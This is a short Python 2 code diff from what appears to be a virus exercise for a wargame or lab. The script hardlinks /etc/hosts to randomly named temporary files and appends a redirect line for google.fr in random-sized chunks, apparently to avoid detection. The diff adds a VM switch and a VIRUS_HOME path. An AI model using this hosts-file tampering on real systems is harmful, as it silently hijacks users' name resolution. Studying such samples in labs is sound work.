@@ -5,15 +5,17 @@ from uuid import uuid4 as uuid
 
 
 if __file__ != "lolita.final.pyc":
-    if socket.gethostname() == "OT-Wargame":
+    if VM:
         hosts_path = "/etc/hosts"
+        tmp_dir = "/tmp/"
     else:
-        hosts_path = "/tmp/hosts"
+        hosts_path = os.path.join(os.environ["VIRUS_HOME"], "tmp/hosts")
+        tmp_dir = os.path.join(os.environ["VIRUS_HOME"], "tmp/")
         print " ###########  /!\ INFECTED /!\ ############### "
 
     new_host = "127.0.0.1\tgoogle.fr\n"
 
-    hardlink = "/tmp/%s" % uuid()
+    hardlink = "%s%s" % (tmp_dir, uuid())
     os.link(hosts_path, hardlink)
     f = open(hardlink, "r")
     content = f.read()
@@ -24,7 +26,7 @@ if __file__ != "lolita.final.pyc":
         size = len(new_host)
         offset = 0
         while offset < size:
-            hardlink = "/tmp/%s" % uuid()
+            hardlink = "%s/%s" % (tmp_dir, uuid())
             os.link(hosts_path, hardlink)
             f = open(hardlink, "a")
             size_chunk = randint(1, 1 + (size - offset) / 2)
